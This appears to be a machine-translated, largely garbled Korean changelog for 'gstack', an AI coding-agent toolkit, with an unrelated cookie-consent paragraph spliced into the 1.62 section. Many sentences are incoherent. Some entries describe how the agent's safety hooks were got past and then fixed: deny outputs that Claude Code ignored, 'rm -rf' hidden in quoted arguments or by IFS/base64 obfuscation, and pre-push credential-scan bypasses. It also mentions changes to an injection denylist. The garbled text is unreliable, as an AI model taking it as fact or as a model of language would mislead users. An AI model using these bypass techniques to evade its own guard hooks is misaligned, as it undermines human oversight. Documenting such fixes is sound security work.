  Windows-reachable spawn는 windowsHide (#1835, 커뮤니티 PRs #2523 및 #2539)를 통과하고, 결정 파일 no는 프로젝트의 밑에 더 긴 땅을 "알파"이라고 지명했습니다.
- **설정 no 첫 번째 실행에 더 긴 걸음** (#2136): Chromium probe는 얻습니다
  전체적인 쐐기 공정 트리를 제거하는 90 초 마감일, 설치는 동시 설정에서 단일 Flight, 그리고 EXIT 클린업 트랩 체인 대신 복제의 서로.
- **종이 컷**: `gh pr edit`는 REST API로 돌아갑니다
  프로젝트 클래스 GraphQL deprecation bites (#1079); v1.27 마이그레이션은 TTY없이 자동 보호되지 않으며 실패한 이름을 완료하지 못했습니다 (#1383); 모델 벤치 마크는 macOS Keychain auth (#1890); 보드 embedding 플래그가 zsh (#1798); `--supersede`를 유지하고, 교체 결정은 `--supersede` (no)의 한 가지 오류를 보여줍니다. probe (no); 계획 검증은 dev 서버가 하드 코딩 포트 목록 대신 선언합니다.

#### 변경

- **모든 곳에서 텔레메틱 디폴트를**: 검색 daemon 이제 읽기
  gstack의 나머지는 동일한 지속적 동의; 부패한 열쇠는 `gstack-config get telemetry` 일치, 불능한 열쇠를 의미합니다.
- **Test-command Detection은 Django 및 config-less 프로젝트를 다룹니다.**: 일
  `manage.py test` 또는 `*_test.go` 스위트는 부트 스트랩을 제공 대신 인식하지 않습니다.
- **Base-branch 검출**: `main`를 더 단단한 bins는 지금
  probe origin/HEAD, origin/main, origin/master 주문시.
- **Eval 모델 해상도는 호스트 중립**: `GSTACK_EVAL_MODEL` (과 일종
  변형)는 모든 6 개의 전화 사이트에서 하드 코딩 모델 ids를 무시합니다.
- 죽은 빈 제거 (`chrome-cdp`, `gstack-open-url`, `gstack-platform-detect`);
  stale-reference scan는 이제 문서가 여전히 일치할 때 이러한 실패 CI와 같은 docs/를 다룹니다.

#### 기여자

- 23개의 새로운 테스트 파일 (+5,499의 테스트 라인): 세션에 대한 행동 스위트
  지속, 독인 번들 probe, 마이그레이션, 동의 CLI, 검증 게이트 신뢰, 원격 측정 선택 아웃, 오프라인 게이트 우회 corpus, 비밀 스칸 출구 계약, 잠금-acquisition 가장자리 지점. ios-qa daemon 스위트 (10 파일)는 이제 `bun test`로 유선 및 sharded 주자; 그것은 CI에서 결코 실행하지 않았다.
- `lib/gbrain-repo-policy-client.ts`는 1개의 장소 repo-policy 층입니다
  읽기; 두 실시 포인트 경로 통해 그것을.
- `lib/context-bill.ts` no 더 긴 이중 카운트는 totalMd에 있는 기술을 배열하고,
  `gstack-context-bill`는 지휘자 env-shims의 밑에 작동합니다.
- Egress 영수증: `bin/gstack-egress verify`는 사슬 intact로 통과합니다;
  코드-intelligence 어댑터는 실패 닫힌 싱크로 등록했습니다.
- 크레딧 : **Sina Matian, 인도** (time-attack/gstack, MIT)의 릴리스 포트 작업
  거의 모든 클러스터를 통해. 커뮤니티 PR은 저자와 흡수 : **Gawie van 블러크** (#2560), **Shawn Reddy의 특징** (#2565), **잼 윌크** (#2523), **제리 니콜스** (#2539). 감사합니다.

## [1.64.1.0] - 2026-08-15

**지금 파이프라인에 있는 각 감시는 불을 provably.** **그리고 codebase는 기능이 작동하지 않는 기능을 설명합니다.**

이 릴리스는 gstack의 부분에서 수정 파입니다. 이전 모델은 썼고 나중에 rips 뒤에 남아 있습니다. 무료 테스트 스위트는 이제 CI에서 per-file 고립과 함께 실행되며, 모든 10 호스트 출력은 각 push, 터널 보안 allowlist는 존재 한 엔드포인트와 보안 문서는 실제로 실행되는 방어를 설명합니다. 하나의 템플릿 버그 수정은 /spec의 기술에서 46KB를 잘라, 8 개의 프로듀서에 대한 다른 기술이 수행됩니다. 24,943 라인 라이터 183 파일.

### 중요 한 숫자

출처: 이 branch의 검증 실행 (`bun test` per-file, `bun run gen:skill-docs --host all`, JSON config dump-diff) 및 `git diff origin/main...HEAD --stat`.

| Metric | 의 전 | 후지후 | 델타 |
|---|---|---|---|
| CI에서 실행되는 무료 테스트 파일 | 0 | 358, 파일 당 1개의 과정 | 건설에 의해 불가능한 truncation |
| Host 실패할 수 있는 doc-freshness 문 | 1 총 10 | 10 총 10 | 두 개의 문은 gitignored 경로 확산 |
| spec/SKILL.md | 127,462 바이트 | 80,924 바이트 | 1개의 전방, 2개 아닙니다 |
| hosts/*.ts 구성 코드 | 595 라인 | 285 라인 | 정의Host () 공장, 바이트 ID 출력 |
| Eval tier-gate 구현 | ~40건, 6건 | 1 | unset-tier 트랩은 영원히 핀으로 꼿습니다 |
| 순수한 repo 크기 | 기본 정보 | -24,943 라인 | 24개의 파일 삭제 outright |

계층 테이블은 느낌이 하나입니다 : `/scrape`, `/diagram`, 그리고 브라우저 발사기는 침묵 기본으로 상속되는 271 선을 흘렸습니다. 기술이 이제 계층 또는 발전기가 빌드를 거부합니다.

### gstack 사용자를 위한 이 뜻은 무엇입니까

Skill invocations for the trimmed utilities load less prose into your context window, /spec loads 46KB lighter, and a red test in this repo now means a red check on the PR that caused it, every time, on every host. If you maintain a fork or embed the browse daemon: two ServerConfig fields that never worked (idleTimeoutMs, chromiumProfile) are gone rather than lying, and GSTACK_SECURITY_ENSEMBLE no longer exists as a knob. Upgrade normally; no migration needed.

### 항목화 된 변경

#### 고정
- CI: 기술 문서 신선도 문은 1개를 통해 10명의 주인을 커버합니다
  `gen:skill-docs --host all` 패스와 트랙드-드립 diff 및 트랙드-스트레이스 체크. Codex 및 공장 게이트 이전에 디핑된 gitignored 경로, 항상 통과.
- CI: 새로운 무료 테스트 워크플로우는 전체 무료 제품군(358 파일)을 하나의 파일로 실행합니다.
  파일에 대한 번 프로세스 prebaked toolchain 이미지. Per-file isolation sidesteps two exposed 침묵 모드 (a process.exit race in server-lifecycle tests, 그리고 co-run module-state bleed) 그리고 역사적인 Bun Exit-0-on-module-load-error behavior.
- 보안: /sidebar-chat 엔드포인트를 TUNNEL_PATHS에서 삭제한 /sidebar-chat 삭제
  감사한 터널 공격 표면. 세트는 지금 정확하게 /connect와 /command이고, 닫히는 세트 핀 시험은 그(것)들을 적용합니다.
- 보안: 삭제 된 체인의 접근 가능한 직분해 낙하,
  경로를 지정한 명령은 범위, 도메인, 탭-다운, 속도 제한, 또는 JS-origin 체크 없이 지정됩니다. JS-origin assertion in read commands is now unconditional.
- 보안: 페이지 내용 로그 (콘솔, 네트워크, 대화 상자, 명령 감사) 이동
  appendSecureFile을 통해 모든 플랫폼에서 생성하는 소유자 전용 권한을 얻습니다.
- Stealth: 머리없는 머리 손전등 경로는 공유 Chromium를 사용합니다.
  CHROMIUM_PROFILE와 GSTACK_HOME를 무시한 하드코드 경로 대신 프로파일 해상도와 싱글턴 잠금을 정리합니다.
- 생성기: /spec의 기술 파일은 두 번 전체를 렌더링
  템플릿은 placeholder를 말 그대로 언급했습니다. 고정; 생성 된 파일에서 제거 된 46,538 바이트.
- 생성기: preamble 계층은 기술 및 누락된 선언에 따라 선언됩니다.
  빌드 오류입니다. 8 개의 기술은 이제 가장 무거운 계층에 기본적으로 기본적으로 고정 된 (스크랩, 다이어그램, 계층 1의 브라우저 발사기를 수행합니다. 착륙 포트, 쌍 에이전트, 계층 2에서 스킬화; 계층 3)의 사양.
- Generator: LearningsMode는 hardcoded 대신 호스트 설정에서 읽습니다.
  호스트 확인, 그래서 7 기본 모드 호스트는 프로젝트-경로 학습을 흐름 그들의 실행을 실행할 수 있습니다.
- 선택 테스트: 터치파일 의존 경로는 디스크에 대한 검증됩니다 (the
  가드는 첫 번째 실행에 4 개의 rotted 항목을 잡았다. 그리고 eval-watch 대쉬보드는 디렉토리에서 부분 결과를 읽습니다. 수집가 쓰기.
- Eval gating: 하나의 기술자2ETier 구현은 ~40의 편류를 대체
  복사. sharded 유료 런너의 프리 spawn 클래스터는 새로운 모양을 이해하므로 게이트는 주기적인 shard 시작을 위해 no 더 긴 지불을 실행합니다.

#### 변경
- hosts/*.ts는 호스트 당 어떤 다른지 선언합니다. 정의Host()는 derives를
  나머지. 모든 10 구성과 0-diff 재생의 JSON 덤프 디프를 통해 입증된 바이트 IDentical.
- pty-session-cookie와 sse-session-cookie는 1개의 세션 관련 공유를 합니다.
  별도의 token 공간과 구현; 터미널 에이전트는 공유 cookie 파서를 사용합니다.
- 1개의 lone-surrogate sanitizer 및 1개의 sanitizeReplacer는 sanitize.ts에서 살고 있습니다;
  1 startTunnel()는 ngrok 시작 순서로 3 번 존재했습니다.
- lib/fs-atomic.ts는 단일 원자 씁니다 구현 (pid+random
  tmp suffix, throw and 조용한 변형, 모드 - - 만들기). lib and find call sites migrated, including a latent deterministic-tmp 충돌 경주 in the worktree dedup index.
- lib/jsonl-store.ts 문서의 실제 계약 (위탁자 스크린
  주입 패턴; enforcing 콜러는 이름), 모드 옵션을 얻을, 그리고 lib-side 바이패스 부스터는 지금 그것을 사용합니다.

#### 제거
- ML 보안 레이어: Haiku 성적표 및
  DeBERTa ensemble (GSTACK_SECURITY_ENSEMBLE), no 생산 칭함, 그리고 그들의 유료 벤치 마크 스위트 및 고정물. 살아있는 경로는 보안 사이드카에서 테스트 된 내용 검사입니다. CLAUDE.md 그리고 BROWSER.md 이제는 정확히 그 문서.
- 5 HostConfig 필드는 아무것도 읽지 않습니다 (metadataFormat, sidecar, 접두사,
  staticFiles, 접합기) 및 완전히 죽은 openclaw 접합기 단위.
- 7개의 등록된 템플릿 위너 no 템플릿 사용, 절대로 입력
  문질러 메커니즘 및 로컬 redeclaration에 조용히 잃어버린 코드 - helpers 그림자 모듈.
- 두 ServerConfig 필드는 문서화되었지만 결코 읽지 않았습니다 (idleTimeoutMs,
  크롬프로필); BROWSE_IDLE_TIMEOUT와 CHROMIUM_PROFILE env는 작동 손잡이 남아 있습니다.
- proactive-suggestions.json (31KB는 각 건물에 재생해, 읽습니다
  아무것도), 두 개의 0-caller bin 스크립트 (gstack-open-url, gstack-platform-detect), 안식 schema 모듈, 세 개의 orphaned 테스트 정착물 (를 포함하여 128KB 황금 그것의 라이브 성공자에서 46KB를 드리는), 그리고 배-idempotency eval의 supersed 중복.
- ~2,000개의 테스트 라인이 삭제된 기능: 두 개의 파일
  소스 파일을 삭제 48 버전 전에, 전체 죽은 엔드 포인트 통합 파일 및 20 설명의 가져오기에 충돌 UX 핀 내부 sidebar-ux.test.ts (그들의 라이브 커버 남아, 지금 녹색).

#### 기여자
- 설정은 --host 커서와 --host 슬레이트 (손 목록 허용 목록)을 받아들입니다
  호스트/index.ts>에서 드리프트를 했다.
- openclaw CLAUDE.md 변형은 실제 템플릿 파일입니다.
  openclaw/templates/ 대신에 문자열 리터럴의 발전기 안에.
- sidebar-agent.ts를 라이브 프로세스로 설명하는 Ghost 댓글은 스크럽으로 스크럽습니다.
  10 파일에서; server.ts tombstone 블록은 삭제 된 식별자를 삽입합니다.
- docs/ADDING_A_HOST.md는 정의Host 패턴을 가르칩니다.

## [1.64.0.0] - 2026-08-14

**한 파에 Ninety fixes. 모든 가드가 말했다 그것은 지금 보호되었습니다. 실제로.**

이 릴리스는 추적기의 전체 감사에서 내장 된 고정 파입니다 : 모든 오픈 PR 및 모든 오픈 문제, 어떤 착륙 전에 주에 대해 확인. 표시된 패턴은 공개 실패를 가졌다. 동결 및주의 후크는 페이로드 모양을 방출 Claude Code 무시, 그래서 deny meant 허용. 적정 사전 푸시 후크는 credential을 할 수있는 여섯 가지 분리 된 경로가 있었다. 테스트 스위트는 자체의 4% 이후 녹색을 종료했습니다. 모든 것은 조정, 회귀 테스트 또는 정적 삼각 핀 각 한 폐쇄.

파는 이름에 의해 적립되는 각 결함을 위한 제일 지역 사회 고침을 흡수합니다: 82의 기여자는 이 방출에서, 몇몇은 독립적인 각 다른 일 안에 동일한 버그를 고쳤습니다. 그 복제는 저희를 방법 많은 사람들이 동일한 벽을 명중하는 추적기입니다.

### 중요 한 숫자

출처: `git log 1.63.0.0..HEAD` 이 branch, PR에 참조된 감사 워크플로 레코드.

| Metric | 의 전 | 후지후 |
|---|---|---|
| 실제로 실행되는 무료-suite 파일 | ~16 434 (truncated, 0 출구) | 모든 434, 솔직한 출구 코드 |
| 차단할 수 있는 가드 걸이 (freeze/careful/team-init) | 0 의 3 | 3 의 3, 실패 |
| Native AskUserQuestion 응답 기록 | 14% | 100%년, suffix 인식 |
| /codex는 macOS 세션 당 끊기 전에 실행합니다 | 1 | 무제한 (mktemp 고정) |
| 이 릴리스에 의해 닫힌 문제 | — | 52 |
| 커뮤니티 PR은 크레딧으로 흡수 | — | ~50 |

스위트 번호는 앉아있는 것입니다. 지연 된 process.exit(0) 하나의 테스트 파일에서 녹색 출구 코드와 전체 실행 중-flight를 죽였다. 그래서 CI의 다른 모든 보증은 실패 할 수없는 스위트에 휴식했다. 그것은 지금 실패 할 수 있습니다, 결함 주입 테스트는 실패 propagates를 증명하고, sharded 주자는 실패로 요약없는 shard를 치료합니다.

### 너를 위한 이 뜻

기술 집행 (/freeze, /careful, 팀 필수 모드) 실제로 블록. 적격 감시는 그들을 막기 대신 큰 디프를 스캔, 그리고 따옴표를 한 인수는 /careful에서 rm -rf를 숨길 수 없습니다. Auto-upgrade un-wedges 자체를 로컬 패치와 함께 설치합니다. 메모리 ingest는 아무 것도 수입하면서 성공을 주장하는 것을 거부합니다. Windows는 벽돌을 멈추지 않습니다. .gunenames, your window-to-gunes, your window-to-to-genting, as you plan. 디자인 이미지 생성은 다시 작동합니다. 업데이트 gstack와 파는 당신의 것입니다.

### 항목화 된 변경

### 고정 - 집행 감시
- /freeze deny and /careful는 HookSpecificOutput의 밑에 둥지를 요구합니다
  Claude Code 그들을 영광; 스코프에서 2 출구와 팀 init 필수 모드 블록. @jawadakram20, @Masashi-Ono0611에 의해 기여.
- /careful는 실제 JSON 파서 (quoted)로 도구 페이로드를 파
  인수 no 더 긴 실행 명령), IFS/base64 obfuscation에 요청, 읽을 수 없는 입력에 닫히지 않고 멀티 라인 명령은 안전한 실행 백리스트를 탈 수 없습니다. @wtamminga에 의해 기여.
- 조사 범위 잠금은 $HOME를 통해 체크 프리즈를 해결합니다 (
  CLAUDE_SKILL_DIR 경로는 후크 시간에 결코 해결되지 않았습니다. @maxpetrusenkoagent에 의해 수정으로 보고되었습니다.
- 런과 함께 실행되는 전문가 리뷰 에이전트_으로_background: false — required
  Claude Code 2.1.198 이후 기본을 배경으로 만들었습니다.

#### 고정 - 자격 및 중복
- 사전 푸시 스캔: 큰 디퓨즈에 대한 선 정렬 된 Chunked scans
  (@luckywenapere), real push-base resolution instead of whole-repo blame (@stormeoio), byte-exact stdin for chained hooks (@francis-eye), --no-ext-diff/--no-textconv, hunk-aware header parsing, fail-closed ref parsing (bypasses reported by @lubosxyz), GOCSPX + Telegram token patterns (@francis-eye), UUID fixture false-positive suppression.
- 페어 에이전트은 ngrok auth YOUR 터미널에서 token를 통해 걸어갑니다
  성적표는 절대 입력하지 않습니다.
- 확장명령 token/port 은 내용 스크립트와 외국에 읽습니다.
  v1.63 핀으로 origin token 모델에 대한 확장, reimplemented. @punksterlabs에 의해 기여.
- diff 9.0.0 (GHSA-73rr-hh4g-fpgx, @genisis0x); OpenAI 기록된 중요한 파일
  0600-at-create (@bunlongheng); 주사-denylist 및 전화-pattern 거짓 긍정적 인 캘리브레이션 (@Masashi-Ono0611, @JonasFocus, @abkrim).

### 고정 - 테스트-스위트 무결성
- 모든 8 지연 process.exit 눈물방울 폭탄 제거; 정적 살충제
  tripwire; 출구 코드 propagation의 결함 주입 증거; sharded 주자는 bun의 요약 없이 0를 출구하는 shards를 실패합니다. @time-attack에서 수선을 가진 @sneakygriff에 의해 공헌하는; @whd4에 의해 고쳐집니다.
- design/test/ 무료 스위트와 sharded runner에 가입하십시오 (그는 결코 ran
  모든 것
- orphaned sidebar 채팅 큐 스위트가 사라집니다. 라이브 사이드 바 테스트 숙박.
- Fork PRs skip eval jobs deterministically instead of red/green by Docker
  운이 좋다. @andrey-esipov에 의해 기여.

#### 고정 - 침묵하는 자료 손실
- 메모리-ingest imports gitignored staging (@gawievanblerk), 재조합
  수입된 Vs 단계 계산 및 버전에 대한 짧은 상태 (@Charles-Grant)에 대한 사전 상태에 대한 거부
- lib/ ship bin/ on each host install — 학습, 결정 및
  Claude Code 외의 텔레메틱 스크립트가 작동한다. @fedster99에 의해 기여; @jizusun의 supabase/config.sh 복사.
- Native AskUserQuestion는 올바르게 파스를 답합니다 (오브젝트 맵 모양),
  (추천) 스프릭스는 동일하고 적출 실패 no 더 긴 독은_recommendation를 비교합니다. @yijisoo; @chu2781에 의해 작업 패치에 근거를 두었습니다.
- autoplan 작업 집계는 실제 작업을 반환 (jq 범위 버그 삼키
  작성자: 2>/dev/null). 작성일: @kkroo.
- Auto-upgrade Pulls with -- 현지에서 패딩 설치 및
  실제 실패 이유를 로그.
- gstack-slug는 Marker walk-up (@ajeenkya)에 의해 프로젝트 루트를 해결합니다.
  슬래시 branch (@ShuratCode)를 canonicalizes, 그리고 원격을 추가하지 않는 힌지를 유지.
- 디자인 이미지 생성: gpt-image-2 도구는 400'd를 짝지어줍니다
  call is fixed (@Pablosinyores), with honest timeout reporting (@vryahn).

### 고정 - Windows
- icacls SID - hostname==username no 더 긴 벽돌 ~/.gstack
  (@asizux2; @Icandi40, @chiragborse1, @IntegriGit, @voltapix26)에 의해 자주적으로 조정.
- 모든 스파셋 시엠을 통해 전달되는 창안 (@jerrynicholsai;
  @jwilk-hrep, @rroojrooj, @WimvandenHeijkant; watchdog는 가용 회로 차단기 (@SYKhayyat); 맨끝 에이전트으로 신호 0 liveness를 사용합니다 소유자에게 일생을 동점 PID (@csarigoz).
- 세 계획 - 두 개의 후크는 공유를 통해 빈을 향한다
  Windows-aware helper (@rafassousa); 설정은 bash prefix (@NikhileshNanduri); BROWSE_BIN .exe (@rroojrooj); polyfill는 종료 된 약속 (@punksterlabs) 및 CJK 터미널 문제가 사라집니다 ( @mindsurf0176, @mindsurf0176, @tomuff에 의해 전체 폭 글꼴 세포에 의해 고정 된 이중 종료).
- 새로운 Windows 회귀 테스트는 창-최신 CI, 뿐만 아니라 실행합니다
  macOS에서 정적 체크.

### 고정 - /codex
- mktemp 템플릿은 X-run trailing을 유지 - /codex 처음 작품
  macOS (@ShuratCode 및 @noron12234; @cathrynlavery)에 달하십시오.
- codex 검토는 별도로 diff args 대신 침묵으로 검토를받습니다.
  더러운 나무 (@fangearhq-boop), 시간 밖으로 감싸 그래서 truncation는 no-findings (@aegixx)로 읽을 중지합니다.
- 검토 모드는 sandboxed read-only를 실행합니다. P0/P1/P2 문은 닫히지 않습니다
  빈, 태그, 또는 비-제로 출력; 모델 제목 400s 액션 가능한지도를 얻을.

#### 고정 — 다른 모든 것
- 49 기술에 익숙하지 않은 Sync 및 원격 측정
  tilde는 결코 확장하지 않습니다 - @jawadakram20). update_check:false는 이제 preamble prose 너무 (@jc0d35). Codex 호스트는 AGENTS.md, CLAUDE.md (@exGeni)를 읽습니다. 설정 --help prints help (@saen-ai). 현재 Claude 세대 (@chrisquorum)에 대한 모델 오버레이. 더 많은 작은 수정을 기록 : 배포 설정 URL 파싱, artifacts-init 프로토콜 처리, keychain auth 검출, 카탈로그 설명 truncation, 트랙 파일 테스트 카운트, 업데이트 체크 충돌 sentinel, 우분투 26.04 탐지, CRLF-stable 발생, 원격 측정 오류 필드, 서버 잠금 진단, 쉘 인용 경로, 벤치 마크 arg 유효성 검사, 그리고 더.

#### 기여자
- 여기에서 사용된 enumerate-first 수리 프로토콜 (defuse, enumerate, Repair)
  제거하기 전에)는 PR에 문서화됩니다. 감사 기록은 세션 워크플로지 저널에 살고 있습니다. 4개의 후속파는 TODOS.md 전체 컨텍스트로 캡처됩니다.

## [1.63.0.0] - 2026-08-13

**모든 gstack는 당신의 기계를 지금 읽을 수 있는 영수증을 나타낸다 보냅니다.** **그리고 eval 마구는 통과 급료를 grading.**

이 릴리스 포트는 GStack 2 포크의 부분이 메인으로 다시 자신의 방법을 적립. 헤드 라인은 해시 체인 egress ledger: 모든 장소 gstack 자체는 지금 당신의 기계를 씁니다 데이터를, 현지, 탬퍼 분명 영수증을 먼저 쓰고 `gstack-egress list` / `verify`는 정확하게 무슨 왼쪽을 보여주고 사슬이 불완전하다는 것을 보여줍니다. 두 개의 새로운 명령 줄 도구는 다음과 같이 발송합니다. `gstack-egress` (감사자의 전망) 및 `gstack-context-bill` (모든 기술 나무를 위한 token 빌의 물자로, 그래서 당신은 당신이 무엇이든을 부수기 전에 당신의 문맥 창을 설치하는 것을 볼 수 있습니다). 시험 마구는 3개의 진짜 고침을, 그(것)들의 한 달 동안 각 기여자에 조용히 lying 되었던 벌레를 가지고 얻었다.

### 중요 한 숫자

출처: 조립된 branch (`git log 1.62.0.0..HEAD`), 무료 스위트 (`bun test`), 그리고 발견 대문 (`test/catalog-budget.test.ts`).

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 영수증을 가진 gstack 소유한 off-machine 수채 | 0 | 모든 enumerated 싱크 | tripwire-enforced, 제로 예외 |
| Eval "no 회귀" 자체 비교가 된 선 | 모든 것 | 0 | 자신의 인-progress 의 축적에 대한 비교된 하네스 |
| 유료 게이트 러너 고립 | 하나의 프로세스, 하나의 걸려 파일이 계층을 죽일 | 파일, 그룹-SIGKILL 당 1개의 과정 | + 절대로 시작된 회계 |
| Discovery 카탈로그 예산 | unenforced | 측정되는 1,105의 토큰 동등한 것, 1,150의 천장 | 모든 기술에 ratchet-protocol 추가 |
| 브라우저 `/health` 엔드포인트 | root auth token를 headed 모드로 로컬 호스트 콜러에 전달 | no token를 어떤 형태에서 봉사합니다 | token 부츠 스트랩은 핀으로 리코인 POST로 이동 |

eval-store line은 gstack: `findPreviousRun` 에 해킹하는 사람에 가장 중요한 것은 기본으로 최신 같은 계층 파일을 선택, 그리고 in-progress `_partial`  축적자는 항상 정렬을 수상, 그래서 자동 비교는 자체에 대한 실행과 인쇄 "no 회귀" no 문제. 그것은 고정, 회귀 테스트, 그리고 수정은 버그에 대한 확인되었다.

### 너를 위한 이 뜻

gstack가 귀하의 데이터와 함께 무엇을 돌리면, 이제 감사할 수 있습니다. `gstack-egress list` 어떤 세션이 끝나고 모든 오프 머신이 보내거나 `gstack-egress verify`가 다시 작성되었는지 확인하기 위해 gstack를 실행하면, eval 비교가 다시 무언가를 의미하며, 유료 게이트는 하나의 쐐기 테스트로 다운받을 수 없으며, `gstack-context-bill`는 당신이 그 전에 기술 변화가 비용으로 변경되는 것을 알려줍니다. 새로운 전화가 없습니다. ledger는 지역이며 영수증은 gstack *attempts*가 보내도록 기록하므로 사고가 감사합니다.

GStack 2 포크에서 Sina Matian (time-attack/gstack); eval-store 버그 수정 및 포트 단축 목록이 선택되어 업스트림을 위해 경화되었습니다.

### 항목화 된 변경

#### 추가
- `gstack-egress` - 해시 체인이던 egress 영수증 파서: `list` (what
  gstack는 오프 머신을 보내려고 시도했습니다. `verify` (체인을 입력하고, 3을 타당성에 종료하십시오), `grants` (각각을 회귀하는 서있는 동의 조정 및 방법).
- `gstack-context-bill` - 스킬 트리에 대한 오프라인 token 빌-of-materials :
  항상 발견 비용 대 per-invocation 비용, `--diff` 두 나무 사이, `--budget`, 그리고 `--exact` (opt-in, 실제 Tokenizer에 대한 측정).
- 해시 체인 egress 영수증 (`lib/egress-receipt.ts`) : 실패 닫히는
  민감한 싱크 (뇌-sync, Memory-ingest, gbrain-sync, telemetry, Tunnels)에 대한 영수증 사본 - 금지, 사용자 - 직면 싱크에 대한 경고로 실패 - 실패 (설계 바이너리의 모델 호출, 업데이트 체크, 대시보드). 삼각 테스트는 트리의 모든 오프 기계 싱크가 유선, 0 개의 침묵 예외와 함께.
- Sharded 유료 게이트 러너 (`test:gate:sharded` / `test:periodic:sharded`) : 하나
  테스트 파일 당 프로세스, 그룹 SIGKILLs의 외부 벽시 타임 아웃 쐐기 파일의 전체 프로세스 트리, 그리고 4 방향 per-shard 상태 그래서 충돌은 패스로 마커드 할 수 없습니다.
- `gstack-context-bill` 및 egress 도구는 표준 `./setup`를 통해 설치합니다.
  다른 모든 gstack 바이너리와 같은 경로.

#### 변경
- 브라우저 `/health` 엔드포인트 no는 더 긴 루트 auth token를 어떤것에서 나릅니다
  모드. 사이드 바 확장은 핀 확장 origin 및 루프백 Host를 필요로하는 새로운 `POST /extension-token`를 통해 token를 부트 스트랩으로 만듭니다. 터널 청취자는 결코 노출하지 않습니다. 한 번 사이드바의 패널 로컬 상태를 다시 다시 다시 업그레이드하여 제품을 설명했습니다.
- 신비한 PTY 시험 아이들은 repo의 발송한 기술, 이렇게 등록할 수 있습니다
  slash-command 게이트 테스트는 실제로 침묵으로 측정하지 않는 테스트의 밑에 기술을 연습합니다.
- Discovery-surface 비용은 이제 문질러 있습니다: `test/catalog-budget.test.ts` 핀
  셀프서비스 래치 프로토콜을 가진 총계 기술 name+description 예산.

#### 고정
- eval 하네스 자동 비교 모든 실행에 대 한 그것의 자신의 in-progress
  축적 및 보고 "no 회귀" 불조건으로. 회귀 테스트로 고정; 비교 지금 최신 *completed* 동일한 계층 실행을 발견.
- 브라우저 `/health` token 누출 (뿌리를 넣는 머리 위드 형태 carve-out
  token 을 로컬 호스트 콜러에.

#### 기여자
- 공유 모듈은 복제 논리를 대체합니다. 1개의 유료 테스트 세트 정의가 소모됩니다.
  무료 전용 필터와 유료 런너, 3 개의 명시적 인 수 (물자 파일, 저자 기술, 레지스트리 항목)가 보더, 컨텍스트 요금 및 카탈로그 게이트로 소비 한 하나의 기술 검열 런너.
- `CLAUDE.md`의 컴파일된 바이너리 주의 수정: `browse/dist`의 binaries에는
  v0.11.16.0 이후의 untracked, 그래서 그들은 no 더 긴 `git status`에서 나타납니다.
- 외부 서비스 E2E 테스트 (Codex, Gemini, 벤치 마크 제공 업체)는 선언됩니다.
  수로 전체 파일 감시를 가진 정기적인 층, 그래서 합병 차단 문은 제 3 자 CLI에 결코 기다리지 않습니다. Codex 주자는 `--skip-git-repo-check` (지금은 비git 일 제에서 요구했습니다)를 통과하고 Gemini 주자는 거짓 실패 대신 비유할 수 없는 CLI (제거 깃발, 은퇴한 auth 경로)를 분류합니다.
- PTY 테스트 러너는 AskUserQuestion를 단일로 썰물로 썰물로 파는 것을 준다.
  논리선과 지구 DEC 커저-시정 잔류물, `test/pty-askuserquestion-single-line.test.ts`에 의해 핀으로 꼿습니다 — 이전에 게이트 테스트 전체 시간 예산을 ate하는 실패 종류.
- `TODOS.md`: egress ledger 교체 (chain-genesis)에서 신청되는 새로운 후속
  레코드), 발사 후 token 부츠 스트랩, eval-watch shard-awareness.

## [1.62.0.0] - 2026-08-12

## **플랜 리뷰는 플랜 모드에서 언제 검토하는지 묻는 것을 멈춥니다.** ## **정상 세션을 보호하는 게이트는 이제 답이 분명하다는 것을 알고 있습니다.**

/plan-eng-review 또는 /plan-design-review 계획 및 검토를 초래하는 동안 만 시작하십시오. No 더 많은 "나는 어떻게 검토해야 합니까? A/B/C"만 감지할 수 있는 대답은 화면에 계획입니다. 기술은 1개의 선 ("스코프 문에서 그것의 선택을 발표합니다: 계획 형태 - 자동 선택된 B (당신의 계획을 검토)를 등 리디렉션할 수 있습니다, 그 후에 일하기 위하여 똑바른. 표적을 명시적으로 지명하십시오 (" PLAN.md는 어떤 형태든지 안으로 건너 뛰고 뛰는 어떤 형태든지 안으로 뛰기 위하여). 어떤 이름도 없이 외부 계획 형태, 문은 전에 정확하게 요구하고, 아직도 단단한 정지입니다.

이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다.

### 중요 한 숫자

출처: 이 branch의 살아있는 PTY eval은 2026-08-11 (~/.gstack-dev/eval-runs/)와 바이트 측정에 있는 로그 생성된 기술 파일에서 실행합니다.

| 이란? | 의 전 | 후지후 |
|------|--------|-------|
| 계획 모드 리뷰의 앞에 질문은 시작 | 1 | 0 |
| 시드 플랜 모드 연기 (발표, no 문 질문) | n/a | 2/2 통행 |
| 외부 계획 모드 회귀 실행 (도메인 요청, 우회 절대 무해) | n/a | 4/4 통행 |
| 찾기 바닥은 계산에서 제외된 게이트와 함께 실행 | trivially satisfiable를 만족시키십시오 | 2/2 통행, 문은 조사하지 않습니다 |
| Stochastic smokes wrongly blocking the CI gate lane | 4 | 0 |

That last row is a repair: four plan-mode/finding-floor smokes were demoted to the weekly tier months ago, but the demotion never took effect — the test files still gated on the blocking lane. They no longer block the gate lane; they run via `bun run test:periodic` (weekly-cron wiring for PTY tests is tracked in TODOS). A new free invariant test makes the declared-vs-actual tier drift impossible to reintroduce silently.

### 너를 위한 이 뜻

플랜 → 검토 → 배 루프는 가장 비단 클릭을 잃습니다. 계획을 초안하고 "/plan-eng-review"라고 말하며, 즉시 계획에 대한 검토가 시작됩니다. 중단, 발표 및 다른 목표를 남는 뒤집을 수 있습니다. /gstack-upgrade를 실행하여 그것을 얻을 수 있습니다.

### 항목화 된 변경

### 추가
